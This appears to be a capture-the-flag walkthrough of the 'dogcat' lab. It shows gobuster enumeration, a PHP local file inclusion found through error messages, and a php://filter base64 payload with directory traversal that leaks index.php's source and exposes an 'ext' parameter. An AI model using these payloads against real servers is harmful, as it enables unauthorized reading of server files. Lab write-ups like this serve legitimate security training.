 HP 7.4.3 rings a bell to me as having a vulnerability, and a quick google confirms this

Let’s use gobuster to find some additional subdirectories:

------------- gobuster-------------------
gobuster dir -u http://$ip  -w  /usr/share/wordlists/dirbuster/directory-list-1.0.txt

/dogs                 (Status: 301) [Size: 309] [--> http://10.10.5.110/dogs/]
/cats                 (Status: 301) [Size: 309] [--> http://10.10.5.110/cats/]


sorce code of http://$ip

we sould notice the commands :
   <img src="cats/4.jpg">
accessing /cats is forbidden — but using the format we found in the source code,

 /cats/4.jpg gives us access. This could be crucial for if we find a way to upload a file.

lets try http://$IP/?view=dogs
 output:
  Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

 Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on 

    We gain following info:
-------------
       We are currently in the /var/www/html/ directory.
       We are currently accessing index.php and trying to include another file.
       It appends .php to the parameter value: dogs => dogs.php.

Appending .php means we are limited to read PHP files.
  The only PHP files we sure exist are index.php, dog.php, and cat.php.
  Reading index.php will be useful because we can understand the PHP code used behind the scenes.


we can assume when we searching ?view=dog ,a file dog.php is executing to send random dogs pictures
 to the client

At this point, I considered attempting to include index.php itself:

http://dogcat.thm/?view=dog/../../../../index

But since PHP files are executed on the server side, their source code isn’t displayed in the browser.
 Instead, the server simply runs the code and returns the output so including a PHP file like index.php won’t reveal its contents directly.



To bypass the issue of PHP files being executed instead of displayed, we can use a clever trick involving PHP stream wrappers. PHP provides special wrappers that alter how files are read. One such wrapper is:
                   php://filter


This allows us to apply filters to a file’s content before it’s processed. 
By using the convert.base64 encode filter, we can encode the raw source code of a file in Base64 effectively allowing us to view the code instead of executing it.

For example, to read the contents of index.php, we could use the following payload:

?view=php://filter/read=convert.base64-encode/resource=index

However, due to the restriction that only allows dog or cat as input, we need to include a valid directory prefix in the path. So, I modified the payload as follows:

?view=php://filter/read=convert.base64-encode/resource=dog/../../../../../var/www/html/index

This successfully returned the Base64 encoded source of index.php, which can then be decoded to reveal the PHP code running on the server.

openthe page source and copied only the encoded string   
run :  echo  $STR | base64 -d
output 
the page part of the source code is :
 <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; // add  the .php extension 
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>


The code checks if the view parameter contains "dog" or "cat" and includes the corresponding file. Additionally, the script allows clients to specify a custom file extension via the ext parameter. If the ext parameter is not provided, the script defaults to appending .php to the included file. This introduces the possibility of including files with different extensions, making it a potential attack vector for exploiting Local File Inclusion (LFI) vulnerabilities.

 Question Hint



1. What is flag 1?
Hint: There's more to *view* than just cats and dogs...
